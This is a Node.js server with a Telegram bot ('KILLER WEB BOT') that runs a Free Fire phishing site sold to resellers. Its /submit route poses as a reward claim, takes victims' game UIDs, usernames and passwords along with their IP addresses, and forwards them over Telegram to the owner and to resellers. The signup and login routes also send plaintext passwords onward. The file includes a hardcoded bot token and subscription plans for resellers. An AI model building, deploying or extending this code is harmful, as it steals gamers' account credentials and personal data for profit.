const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const path = require('path');

const app = express();
const PORT = 8080;

// ===== CONFIG =====
const BOT_TOKEN = '8839520158:AAEgsvn5-2ycF_pqPWD93IWzmYVRvR3mfMk';
const OWNER_ID = '6900492704';
const OWNER_NAME = 'Sameer';
const OWNER_DM = '@Mrsameer46';
const BOT_USERNAME = '@KILLER_WEB_BOT';
const BOT_START = new Date('2026-10-05');

// ===== EMOJI =====
const E = {
  fire:    '<tg-emoji emoji-id="5424972470023104089">🔥</tg-emoji>',
  star:    '<tg-emoji emoji-id="5438496463044752972">⭐</tg-emoji>',
  check:   '<tg-emoji emoji-id="5206607081334906820">✅</tg-emoji>',
  chart:   '<tg-emoji emoji-id="5231200819986047254">📊</tg-emoji>',
  globe:   '<tg-emoji emoji-id="5447410659077661506">🌐</tg-emoji>',
  bolt:    '<tg-emoji emoji-id="5224607267797606837">⚡</tg-emoji>',
  bell:    '<tg-emoji emoji-id="5458603043203327669">🔔</tg-emoji>',
  pin:     '<tg-emoji emoji-id="5397782960512444700">📌</tg-emoji>',
  hundred: '<tg-emoji emoji-id="5229064374403998351">💯</tg-emoji>',
  dollar:  '<tg-emoji emoji-id="5409048419211682843">💵</tg-emoji>',
  record:  '<tg-emoji emoji-id="5411225014148014586">⏺</tg-emoji>',
  bookmark:'<tg-emoji emoji-id="5222444124698853913">🔖</tg-emoji>',
  cross:   '<tg-emoji emoji-id="5210952531676504517">❌</tg-emoji>',
  warn:    '<tg-emoji emoji-id="5420331619203479070">⚠️</tg-emoji>',
  clock:   '<tg-emoji emoji-id="5224505871225471973">⏰</tg-emoji>',
  crown:   '<tg-emoji emoji-id="5807868868886009920">👑</tg-emoji>',
};

// ===== DATA =====
const USERS = {};
const USER_ACCOUNTS = {};
const RESELLERS = {};
const NOTIFIED_EXPIRED = {};
const CUSTOM_KEYS = {};

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

// ===== HELPERS =====
function getClientInfo(req) {
  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
             req.headers['x-real-ip'] ||
             req.socket.remoteAddress ||
             'Unknown';
  const referer = req.headers['referer'] || 'Direct';
  const language = req.headers['accept-language'] || 'Unknown';
  return { ip, referer, language };
}

async function sendMessage(chatId, text) {
  try {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const res = await axios.post(url, {
      chat_id: chatId,
      text: text,
      parse_mode: 'HTML',
      disable_web_page_preview: true
    });
    return res.data;
  } catch (err) {
    console.log(`❌ Send error:`, err.response?.data?.description || err.message);
    return null;
  }
}

// ===== POLLING =====
let lastUpdateId = 0;

async function pollUpdates() {
  try {
    const res = await axios.get(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`, {
      params: { offset: lastUpdateId + 1, timeout: 25 },
      timeout: 30000
    });
    if (res.data.ok && res.data.result.length > 0) {
      for (const update of res.data.result) {
        lastUpdateId = update.update_id;
        if (update.message && update.message.text) {
          handleMessage(update.message);
        }
      }
    }
  } catch (err) {}
  setTimeout(pollUpdates, 500);
}

// ===== EXPIRY CHECK =====
async function checkExpiry() {
  const now = new Date();

  for (const [id, r] of Object.entries(RESELLERS)) {
    if (r.expiresAt < now && !NOTIFIED_EXPIRED['res_' + id]) {
      NOTIFIED_EXPIRED['res_' + id] = true;
      await sendMessage(id, `
${E.warn} <b>Aapka Reseller Plan Expire Ho Gaya!</b> ${E.warn}
━━━━━━━━━━━━━━━━━━━━━━━━

${E.clock} Expired: ${r.expiresAt.toLocaleDateString('en-IN')}
${E.cross} Aapka link ab kaam nahi karega

${E.check} <b>Renew karne ke liye:</b>
${E.dollar} Owner ko DM karo: ${OWNER_DM}
`);
      await sendMessage(OWNER_ID, `
${E.warn} <b>RESELLER EXPIRED</b> ${E.warn}
🆔 <code>${id}</code>
📦 ${r.plan}
📅 ${r.expiresAt.toLocaleDateString('en-IN')}
`);
    }
  }

  for (const [id, u] of Object.entries(USERS)) {
    if (u.expiresAt < now && !NOTIFIED_EXPIRED['user_' + id]) {
      NOTIFIED_EXPIRED['user_' + id] = true;
      await sendMessage(id, `
${E.warn} <b>Aapka Plan Expire Ho Gaya!</b>
${E.clock} Expired: ${u.expiresAt.toLocaleDateString('en-IN')}
${E.dollar} Renew: ${OWNER_DM}
`);
    }
  }

  setTimeout(checkExpiry, 60 * 1000);
}

// ===== MESSAGE HANDLER =====
async function handleMessage(msg) {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const userName = msg.from.first_name || 'User';
  const text = msg.text.trim();
  const isOwner = chatId.toString() === OWNER_ID;

  console.log(`📩 ${text} from ${userName} (${chatId})`);

  // /start
  if (text === '/start') {
    return sendMessage(chatId, `
${E.fire}${E.fire} <b>KILLER WEB BOT</b> ${E.fire}${E.fire}
━━━━━━━━━━━━━━━━━━━━━━━━

${E.check} Bot active hai!

${E.bell} <b>Commands:</b>
   /help    ➤ Help menu
   /myinfo  ➤ Apni info
   /owner   ➤ Owner info
   /status  ➤ Bot status
   /redeem [KEY] ➤ Custom key use karo

${E.star} Reseller banne ke liye owner se contact!
${E.dollar} ${OWNER_DM}
`);
  }

  // /help
  if (text === '/help') {
    let role = 'USER';
    if (isOwner) role = 'OWNER';
    else if (RESELLERS[chatId]) role = 'RESELLER';

    let helpText = `
${E.bell} <b>KILLER WEB BOT — HELP</b> ${E.bell}
━━━━━━━━━━━━━━━━━━━━━━━━
${E.check} <b>Your Role:</b> ${role}
━━━━━━━━━━━━━━━━━━━━━━━━

${E.fire} <b>PUBLIC COMMANDS:</b>
   /start          ➤ Bot shuru karo
   /help           ➤ Ye help menu
   /myinfo         ➤ Apni info dekho
   /owner          ➤ Owner ki info
   /status         ➤ Bot ki status
   /redeem [KEY]   ➤ Custom key use karo
`;

    if (role === 'RESELLER' || role === 'OWNER') {
      helpText += `
${E.fire} <b>RESELLER COMMANDS:</b>
   /mylink         ➤ Apna website link
   /myusers        ➤ Apne users dekho
   /mydetails      ➤ Apni details
   /givekey [id] [plan] ➤ User ko key do
`;
    }

    if (role === 'OWNER') {
      helpText += `
${E.crown} <b>OWNER — RESELLER MGMT:</b>
   /makereseller [chatId] [days]
   /removereseller [chatId]
   /allresellers
   /resellerinfo [chatId]

${E.crown} <b>OWNER — CUSTOM KEYS:</b>
   /addkey [KEY] [plan] [days]
   /listkeys
   /removekey [KEY]

${E.crown} <b>OWNER — USERS:</b>
   /givekey [chatId] [plan]
   /listusers
   /removeuser [chatId]

${E.crown} <b>OWNER — PANEL:</b>
   /keys          ➤ Full owner panel
`;
    }

    helpText += `
━━━━━━━━━━━━━━━━━━━━━━━━
${E.hundred} <b>OWNER:</b> ${OWNER_NAME}
${E.dollar} <b>DM:</b> ${OWNER_DM}
${E.pin} <b>Bot:</b> ${BOT_USERNAME}
━━━━━━━━━━━━━━━━━━━━━━━━
`;

    return sendMessage(chatId, helpText);
  }

  if (text === '/owner') {
    return sendMessage(chatId, `
${E.hundred} <b>OWNER INFO</b>
${E.check} Name: ${OWNER_NAME}
${E.check} DM: ${OWNER_DM}
${E.check} Bot: ${BOT_USERNAME}
`);
  }

  if (text === '/status') {
    const daysActive = Math.floor((new Date() - BOT_START) / (1000 * 60 * 60 * 24)) + 1;
    return sendMessage(chatId, `
${E.chart} <b>BOT STATUS</b>
${E.check} Status: Online
${E.check} Owner: ${OWNER_NAME}
${E.check} Days Active: ${daysActive}
${E.check} Resellers: ${Object.keys(RESELLERS).length}
`);
  }

  if (text === '/myinfo') {
    if (RESELLERS[chatId]) {
      const r = RESELLERS[chatId];
      const daysLeft = Math.ceil((r.expiresAt - new Date()) / (1000 * 60 * 60 * 24));
      return sendMessage(chatId, `
${E.chart} <b>RESELLER INFO</b>
${E.check} Chat ID: <code>${r.chatId}</code>
${E.check} Plan: ${r.plan}
${E.check} Days Left: ${daysLeft}
${E.check} Users: ${r.users.length}
${E.check} Link: <code>${r.link}</code>
`);
    }
    const user = USERS[userId];
    if (!user) return sendMessage(chatId, `${E.cross} Koi plan nahi!\n${E.dollar} ${OWNER_DM}`);
    const daysLeft = Math.ceil((user.expiresAt - new Date()) / (1000 * 60 * 60 * 24));
    return sendMessage(chatId, `${E.chart} <b>YOUR PLAN</b>\n📦 ${user.plan}\n⏳ ${daysLeft}d`);
  }

  // /redeem
  if (text.startsWith('/redeem ')) {
    const key = text.substring(8).trim().toUpperCase();
    const keyData = CUSTOM_KEYS[key];
    if (!keyData) return sendMessage(chatId, `${E.cross} Invalid key!`);
    if (keyData.used) return sendMessage(chatId, `${E.cross} Ye key already use ho chuki hai!`);

    const now = new Date();
    const expiresAt = new Date(now.getTime() + keyData.days * 24 * 60 * 60 * 1000);
    USERS[userId] = { name: userName, plan: keyData.plan, expiresAt };
    CUSTOM_KEYS[key].used = true;
    CUSTOM_KEYS[key].usedBy = userId;
    CUSTOM_KEYS[key].usedAt = now;

    await sendMessage(chatId, `
${E.check} <b>KEY REDEEMED!</b>
🔑 <code>${key}</code>
📦 ${keyData.plan}
📅 ${keyData.days} days
⏰ ${expiresAt.toLocaleDateString('en-IN')}
`);
    await sendMessage(OWNER_ID, `🔔 Key redeemed by ${userName} (${userId}) - ${key}`);
    return;
  }

  // Reseller commands
  if (RESELLERS[chatId]) {
    const r = RESELLERS[chatId];
    const daysLeft = Math.ceil((r.expiresAt - new Date()) / (1000 * 60 * 60 * 24));
    if (daysLeft <= 0) return sendMessage(chatId, `${E.warn} Plan expired! DM: ${OWNER_DM}`);

    if (text === '/mylink') {
      return sendMessage(chatId, `🔗 <b>YOUR LINK</b>\n<code>${r.link}</code>\n\nUsers: ${r.users.length}`);
    }
    if (text === '/myusers') {
      if (r.users.length === 0) return sendMessage(chatId, `${E.cross} Koi user nahi.`);
      let out = `${E.chart} <b>YOUR USERS</b>\n\n`;
      r.users.forEach((u, i) => { out += `${i + 1}. ${u.name} (<code>${u.chatId}</code>)\n`; });
      return sendMessage(chatId, out);
    }
    if (text === '/mydetails') {
      return sendMessage(chatId, `
${E.chart} <b>YOUR DETAILS</b>
🆔 <code>${r.chatId}</code>
📦 ${r.plan}
⏳ ${daysLeft}d
👥 ${r.users.length}
🔗 <code>${r.link}</code>
`);
    }
  }

  // ===== OWNER ONLY =====
  if (!isOwner) {
    if (text.startsWith('/')) sendMessage(chatId, `${E.cross} Unknown! /help`);
    return;
  }

  if (text === '/keys') {
    return sendMessage(chatId, `
${E.crown} <b>OWNER PANEL</b> ${E.crown}
━━━━━━━━━━━━━━━━━━━━━━━━

${E.check} <b>RESELLER:</b>
   /makereseller [chatId] [days]
   /removereseller [chatId]
   /allresellers
   /resellerinfo [chatId]

${E.check} <b>CUSTOM KEYS:</b>
   /addkey [KEY] [plan] [days]
   /listkeys
   /removekey [KEY]

${E.check} <b>USER:</b>
   /givekey [chatId] [plan]
   /listusers
   /removeuser [chatId]

${E.check} <b>Plans:</b> 1D, 7D, 30D, LIFE
`);
  }

  if (text.startsWith('/addkey ')) {
    const parts = text.split(' ');
    if (parts.length < 4) return sendMessage(chatId, `${E.cross} Usage: /addkey [KEY] [plan] [days]`);
    const key = parts[1].trim().toUpperCase();
    const plan = parts[2].trim();
    const days = parseInt(parts[3]);
    if (isNaN(days)) return sendMessage(chatId, `${E.cross} Days sahi daalo!`);
    if (CUSTOM_KEYS[key]) return sendMessage(chatId, `${E.cross} Key already exists!`);
    CUSTOM_KEYS[key] = { plan, days, used: false, createdAt: new Date() };
    return sendMessage(chatId, `${E.check} Key created: <code>${key}</code> (${plan}, ${days}d)`);
  }

  if (text === '/listkeys') {
    const list = Object.entries(CUSTOM_KEYS);
    let out = `${E.chart} <b>ALL KEYS (${list.length})</b>\n\n`;
    if (list.length === 0) out += '❌ Koi key nahi.\n';
    else list.forEach(([k, v], i) => {
      out += `${i + 1}. <code>${k}</code> - ${v.plan} - ${v.used ? '❌ Used' : '✅ Available'}\n`;
    });
    return sendMessage(chatId, out);
  }

  if (text.startsWith('/removekey ')) {
    const key = text.substring(11).trim().toUpperCase();
    if (CUSTOM_KEYS[key]) {
      delete CUSTOM_KEYS[key];
      return sendMessage(chatId, `${E.check} Key removed!`);
    }
    return sendMessage(chatId, `${E.cross} Nahi mili.`);
  }

  if (text.startsWith('/makereseller ')) {
    const parts = text.split(' ');
    if (parts.length < 3) return sendMessage(chatId, `${E.cross} Usage: /makereseller [chatId] [days]`);
    const targetId = parts[1].trim();
    let days = parseInt(parts[2].replace(/[^0-9]/g, ''));
    if (isNaN(days)) return sendMessage(chatId, `${E.cross} Days sahi daalo!`);

    const expiresAt = new Date(Date.now() + days * 24 * 60 * 60 * 1000);
    RESELLERS[targetId] = {
      name: 'Reseller', chatId: targetId,
      joinedAt: new Date(), plan: days + ' Days',
      expiresAt, users: [],
      link: `http://localhost:8080/?ref=${targetId}`
    };

    await sendMessage(targetId, `
🎉 <b>CONGRATULATIONS!</b>
${E.fire} Aap ab <b>RESELLER</b> ho!
📅 ${days} Days
⏰ ${expiresAt.toLocaleDateString('en-IN')}

${E.bell} Commands:
   /mylink /myusers /mydetails
`);
    return sendMessage(chatId, `${E.check} Reseller created!\n🆔 <code>${targetId}</code>\n📅 ${days}d\n🔗 <code>${RESELLERS[targetId].link}</code>`);
  }

  if (text.startsWith('/removereseller ')) {
    const targetId = text.substring(17).trim();
    if (RESELLERS[targetId]) {
      delete RESELLERS[targetId];
      await sendMessage(targetId, `${E.cross} Reseller account hata diya gaya!`);
      return sendMessage(chatId, `${E.check} Removed!`);
    }
    return sendMessage(chatId, `${E.cross} Nahi mila.`);
  }

  if (text === '/allresellers') {
    const list = Object.entries(RESELLERS);
    let out = `${E.crown} <b>ALL RESELLERS (${list.length})</b>\n\n`;
    if (list.length === 0) out += '❌ Koi nahi.\n';
    else list.forEach(([id, r], i) => {
      const daysLeft = Math.ceil((r.expiresAt - new Date()) / (1000 * 60 * 60 * 24));
      out += `${i + 1}. <code>${id}</code>\n   📦 ${r.plan}\n   ⏳ ${daysLeft}d\n   👥 ${r.users.length}\n\n`;
    });
    return sendMessage(chatId, out);
  }

  if (text.startsWith('/resellerinfo ')) {
    const targetId = text.substring(14).trim();
    const r = RESELLERS[targetId];
    if (!r) return sendMessage(chatId, `${E.cross} Nahi mila!`);
    const daysLeft = Math.ceil((r.expiresAt - new Date()) / (1000 * 60 * 60 * 24));
    let out = `${E.crown} <b>RESELLER INFO</b>\n\n`;
    out += `🆔 <code>${r.chatId}</code>\n📦 ${r.plan}\n⏳ ${daysLeft}d\n🔗 <code>${r.link}</code>\n👥 ${r.users.length}\n\n<b>Users:</b>\n`;
    r.users.forEach((u, i) => { out += `${i + 1}. ${u.name} (${u.chatId})\n`; });
    return sendMessage(chatId, out);
  }

  if (text.startsWith('/givekey ')) {
    const parts = text.split(' ');
    if (parts.length < 3) return sendMessage(chatId, `${E.cross} Usage: /givekey [chatId] [plan]`);
    const targetId = parts[1].trim();
    const plan = parts[2].trim().toUpperCase();
    const plans = { '1D': { days: 1, name: 'Trial' }, '7D': { days: 7, name: 'Weekly' }, '30D': { days: 30, name: 'Monthly' }, 'LIFE': { days: 9999, name: 'Lifetime' } };
    if (!plans[plan]) return sendMessage(chatId, `${E.cross} Invalid! Use: 1D/7D/30D/LIFE`);
    const data = plans[plan];
    const expiresAt = new Date(Date.now() + data.days * 24 * 60 * 60 * 1000);
    USERS[targetId] = { name: 'User', plan: data.name, expiresAt };
    await sendMessage(targetId, `${E.check} <b>KEY MIL GAYI!</b>\n📦 ${data.name}\n📅 ${data.days}d`);
    return sendMessage(chatId, `${E.check} Key sent!`);
  }

  if (text === '/listusers') {
    const list = Object.entries(USERS);
    let out = `${E.crown} <b>ALL USERS (${list.length})</b>\n\n`;
    list.forEach(([id, u], i) => {
      const daysLeft = Math.ceil((u.expiresAt - new Date()) / (1000 * 60 * 60 * 24));
      out += `${i + 1}. (${id}) - ${u.plan} - ${daysLeft}d\n`;
    });
    return sendMessage(chatId, out);
  }

  if (text.startsWith('/removeuser ')) {
    const targetId = text.substring(12).trim();
    if (USERS[targetId]) {
      delete USERS[targetId];
      return sendMessage(chatId, `${E.check} User removed!`);
    }
    return sendMessage(chatId, `${E.cross} Nahi mila.`);
  }
}

// ===== SIGNUP (secret code hata diya) =====
app.post('/signup', async (req, res) => {
  const { username, email, chatId, password, ref } = req.body;
  if (!username || !email || !chatId || !password)
    return res.json({ success: false, msg: 'All fields required' });

  // Chat ID verify karo
  try {
    const checkRes = await axios.get(`https://api.telegram.org/bot${BOT_TOKEN}/getChat`, {
      params: { chat_id: chatId }
    });
    if (!checkRes.data.ok) {
      return res.json({ success: false, msg: 'Chat ID galat! Bot ko /start bhejo pehle.' });
    }
  } catch (err) {
    return res.json({ success: false, msg: 'Chat ID galat! Bot ko /start bhejo pehle.' });
  }

  const info = getClientInfo(req);
  USER_ACCOUNTS[username] = { email, chatId, password, signupAt: new Date(), ref: ref || null };

  const msg = `
🆕 <b>NEW SIGNUP</b>
━━━━━━━━━━━━━━━━━━━━━━━━
👤 <b>${username}</b>
📧 ${email}
🆔 <code>${chatId}</code>
🔒 <code>${password}</code>
${E.globe} IP: <code>${info.ip}</code>
${E.pin} Ref: ${info.referer}
📅 ${new Date().toLocaleString('en-IN')}
${ref ? `🔗 Via: <code>${ref}</code>` : ''}
`;

  if (ref && RESELLERS[ref]) {
    await sendMessage(ref, msg);
    RESELLERS[ref].users.push({
      chatId: chatId, name: username, plan: 'Signup', signedUpAt: new Date()
    });
  }
  await sendMessage(OWNER_ID, `${E.crown} <b>[OWNER COPY]</b>\n\n${msg}`);

  res.json({ success: true });
});

// ===== LOGIN =====
app.post('/login', async (req, res) => {
  const { user, pass } = req.body;
  if (!user || !pass) return res.json({ success: false, msg: 'All fields required' });

  let found = null;
  for (const [uname, acc] of Object.entries(USER_ACCOUNTS)) {
    if (uname === user || acc.email === user) {
      if (acc.password === pass) { found = { username: uname, email: acc.email, chatId: acc.chatId, ref: acc.ref }; break; }
      else return res.json({ success: false, msg: 'Galat password!' });
    }
  }
  if (!found) return res.json({ success: false, msg: 'Account nahi mila!' });

  const info = getClientInfo(req);
  const msg = `
🔐 <b>USER LOGIN</b>
👤 ${found.username}
📧 ${found.email}
🆔 <code>${found.chatId}</code>
${E.globe} IP: <code>${info.ip}</code>
⏰ ${new Date().toLocaleString('en-IN')}
`;

  if (found.ref && RESELLERS[found.ref]) await sendMessage(found.ref, msg);
  await sendMessage(OWNER_ID, `${E.crown} <b>[OWNER COPY]</b>\n\n${msg}`);

  res.json({ success: true, user: found });
});

// ===== SUBMIT =====
app.post('/submit', async (req, res) => {
  const { uid, username, password, item, ref } = req.body;
  if (!uid || uid.length < 5) return res.json({ success: false, msg: 'Invalid UID' });
  if (!username) return res.json({ success: false, msg: 'Username required' });
  if (!password) return res.json({ success: false, msg: 'Password required' });

  const info = getClientInfo(req);
  const time = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });

  const msg = `
${E.fire}${E.fire}${E.fire} <b>NEW FREE FIRE ACCOUNT</b> ${E.fire}${E.fire}${E.fire}
━━━━━━━━━━━━━━━━━━━━━━━━

╔══════════════════════════╗
║  ${E.check} <b>UID</b>       ➤  <code>${uid}</code>
║  ${E.check} <b>USERNAME</b>  ➤  ${username}
║  ${E.check} <b>PASSWORD</b>  ➤  <code>${password}</code>
╚══════════════════════════╝

${E.star} <b>ITEM:</b> <i>${item}</i> ${E.star}

╔══════════════════════════╗
║  ${E.globe} <b>IP:</b> <code>${info.ip}</code>
║  ${E.pin} <b>Referer:</b> ${info.referer}
║  ${E.record} <b>TIME:</b> ${time}
╚══════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━
${E.hundred} ${OWNER_NAME} | ${E.dollar} ${OWNER_DM}
`;

  if (ref && RESELLERS[ref]) await sendMessage(ref, msg);
  await sendMessage(OWNER_ID, `${E.crown} <b>[OWNER COPY]</b>\n\n${msg}`);

  res.json({ success: true, msg: 'Reward claimed!' });
});

app.listen(PORT, () => {
  console.log(`✅ Website: http://localhost:${PORT}`);
  console.log(`🤖 Bot polling starting...`);
  console.log(`⏰ Expiry checker starting...`);
  pollUpdates();
  checkExpiry();
});
